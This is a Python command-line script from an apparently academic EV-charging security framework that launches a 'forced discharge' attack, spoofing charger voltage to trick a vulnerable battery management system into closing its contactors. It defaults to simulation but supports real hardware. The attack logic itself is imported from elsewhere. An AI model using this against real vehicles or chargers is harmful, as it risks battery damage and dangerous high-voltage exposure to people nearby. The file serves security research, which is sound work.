"""CLI entry — runs HotWire as an EVSE that lies about EVSEPresentVoltage
to trick a vulnerable BMS into closing its contactors.

**Safety warning:** this attack requires physical high-voltage gear on the
real-hardware side (resistive load bank, isolation, emergency disconnect).
See SAFETY.md. The software-only path is safe to run against another
HotWire PEV instance for demo / CI purposes — it proves the protocol
lie propagates, but does not move actual electrons.

Typical use::

    # Software-only demo (no hardware):
    python scripts/attacks/forced_discharge.py --voltage 380

    # Headless against a co-located PEV process over loopback:
    python scripts/attacks/forced_discharge.py --voltage 380 --headless

See :class:`hotwire.attacks.ForcedDischarge` for the attack itself and
paper §4 Attack 2 for the threat model.
"""
from __future__ import annotations

import argparse
import os
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))

from hotwire.attacks import ForcedDischarge  # noqa: E402
from hotwire.core.config import load as load_config  # noqa: E402


def _run_headless(attack: ForcedDischarge, is_sim: bool) -> int:
    from hotwire.core.worker import HotWireWorker
    from hotwire.fsm.pause_controller import PauseController

    pc = PauseController()
    attack.apply(pc)

    start_ms = int(time.time() * 1000)

    def trace(s: str) -> None:
        dt = int(time.time() * 1000) - start_ms
        print(f"[{dt}ms] {s}", flush=True)

    def show_status(s: str, selection: str = "") -> None:
        if selection:
            print(f"[STATUS/{selection}] {s}", flush=True)

    worker = HotWireWorker(
        callbackAddToTrace=trace,
        callbackShowStatus=show_status,
        mode=attack.mode,
        isSimulationMode=1 if is_sim else 0,
        pause_controller=pc,
    )
    try:
        while True:
            time.sleep(0.03)
            worker.mainfunction()
    except KeyboardInterrupt:
        print("\n[attack] interrupted")
        return 0


def _run_gui(attack: ForcedDischarge, is_sim: bool) -> int:
    from hotwire.gui.app import run_gui

    return run_gui(mode=attack.mode, is_simulation=is_sim, attack=attack)


def main() -> int:
    parser = argparse.ArgumentParser(
        description="HotWire Attack A2 — Forced discharge via EVSEPresentVoltage lie"
    )
    parser.add_argument(
        "--voltage",
        type=int,
        default=380,
        help="Fake EVSEPresentVoltage to announce (V). Usually close to the "
             "target EV's battery voltage. Default: 380.",
    )
    parser.add_argument(
        "--current",
        type=int,
        default=1,
        help="Fake EVSEPresentCurrent announced during the CurrentDemand "
             "loop (A). Must be non-zero so the EV doesn't abort; actual "
             "current is dictated by the attacker's load bank. Default: 1.",
    )
    parser.add_argument(
        "--headless",
        action="store_true",
        help="Run without the PyQt6 GUI.",
    )
    parser.add_argument(
        "--hw", action="store_true",
        help="Use real PLC hardware. See SAFETY.md before enabling.",
    )
    parser.add_argument("--config", help="Override HOTWIRE_CONFIG path.")
    args = parser.parse_args()

    if args.config:
        os.environ["HOTWIRE_CONFIG"] = args.config
    elif "HOTWIRE_CONFIG" not in os.environ:
        os.environ["HOTWIRE_CONFIG"] = str(
            Path(__file__).resolve().parent.parent.parent
            / "config" / "hotwire.ini"
        )
    load_config()

    attack = ForcedDischarge(voltage=args.voltage, current=args.current)
    print(attack.describe())
    is_sim = not args.hw
    return _run_headless(attack, is_sim) if args.headless else _run_gui(attack, is_sim)


if __name__ == "__main__":
    sys.exit(main())
